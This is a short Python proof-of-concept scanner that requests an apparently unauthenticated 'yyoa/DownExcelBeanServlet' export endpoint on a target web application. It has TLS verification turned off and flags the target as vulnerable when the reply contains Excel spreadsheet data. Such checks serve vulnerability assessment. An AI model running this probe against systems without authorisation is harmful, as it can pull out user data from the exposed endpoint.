import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "[Content_Types].xml" in response.text and "Excel.Sheet" in response.text:
		poc10=True
	else:
		poc10=False
	if poc10:
		return True
	else:
		return False
